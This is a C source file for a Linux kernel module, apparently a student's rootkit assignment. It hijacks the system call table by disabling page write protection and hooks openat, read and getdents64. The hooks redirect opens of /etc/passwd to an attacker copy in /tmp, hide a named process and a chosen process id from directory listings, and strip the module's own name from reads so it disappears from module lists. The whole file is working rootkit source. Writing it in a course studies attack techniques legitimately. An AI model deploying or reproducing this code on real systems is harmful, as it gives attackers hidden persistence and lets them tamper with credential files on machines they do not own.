#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>

#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/dirent.h>

#define PREFIX "sneaky_process"

/**
 * @brief One parameter passed in this module
 * The parameter is the sneaky process's id
 */
static char * sneakyProcessId = "";
module_param(sneakyProcessId, charp, 0);
MODULE_PARM_DESC(sneakyProcessId, "A string sneaky process id");


//This is a pointer to the system call table
static unsigned long *sys_call_table;


// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs * regs)
{
  // Implement the sneaky part here
  /*************** my code **************/
  const char * target = "/etc/passwd";
  const char * copyFrom = "/tmp/passwd";
  char * ans = NULL;
  ans = kzalloc(1024, GFP_KERNEL);
  copy_from_user(ans, (char*)regs->si, 1024);

  if(strcmp(ans, target) == 0) {
    copy_to_user((char*)regs->si, copyFrom, strlen(copyFrom) + 1);
  }

  kfree(ans);
  return (*original_openat)(regs);
}

/********** sneaky read ************/
//save address of the original 'read' syscall.
asmlinkage int (*original_read)(struct pt_regs *);
//delete the mod name in reg
asmlinkage ssize_t sneaky_sys_read(struct pt_regs * regs){
  ssize_t nread = original_read(regs);
  
  char* begin = NULL;
  char* end = NULL;
  char * buffer = kzalloc(nread, GFP_KERNEL);
  copy_from_user(buffer, (char *) regs->si, nread);
  if (nread > 0){
    begin = strstr(buffer, "sneaky_mod ");\
    if(begin != NULL){
      end = strchr(begin, '\n');
      if(end != NULL){
        end++;
        memcpy(begin, end, nread - (end - buffer));
        nread = nread - (ssize_t)(end - begin);
      }
    }
    copy_to_user((char *) regs->si,buffer,nread);
  }
  return nread;
}

/********** snearky getdents *******/
//save address of the original 'getdents64' syscall.
asmlinkage int (*original_getdents64)(struct pt_regs *);
//reference ： https://www.cnblogs.com/fnlingnzb-learner/p/6472404.html
//reference : https://xcellerator.github.io/posts/linux_rootkits_06/
asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs) {
  int nread = original_getdents64(regs); 
  if (nread == -1){
    return nread;
  }
  struct linux_dirent64 * d = NULL;
  struct linux_dirent64 * ans = NULL;
  struct linux_dirent64 __user * originalFile = (struct linux_dirent64 *)regs->si;
  
  ans = kzalloc(nread, GFP_KERNEL);
  if (ans == NULL){
    return nread;
  }
  copy_from_user(ans, originalFile, nread);
  unsigned long offset = 0;
  while (offset < nread) {
    d = (void *)ans + offset;
    if (strcmp(PREFIX, d->d_name) == 0 || strcmp(sneakyProcessId, d->d_name) == 0) {
      memcpy(d, (void *)d + d->d_reclen, nread - (offset + d->d_reclen));
      nread = nread - d->d_reclen;
    }
    else{
      offset = offset + d->d_reclen;
    }
  }
  copy_to_user(originalFile, ans, nread);
  kfree(ans);
  return nread;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  /******************** my code ***********************/
  //reference: https://infosecwriteups.com/linux-kernel-module-rootkit-syscall-table-hijacking-8f1bc0bd099c
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  original_read = (void *)sys_call_table[__NR_read];

  
  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);
  
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;

  // You need to replace other system calls you need to hack here
  /********************* my  implementation *************************/
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  /*************** my code *************************/
  // printk(KERN_INFO "1111111\n");
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  sys_call_table[__NR_read] = (unsigned long)original_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);  
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");
MODULE_AUTHOR("yz723");


//reference: https://docs-conquer-the-universe.readthedocs.io/zh_CN/latest/linux_rootkit/fundamentals.html

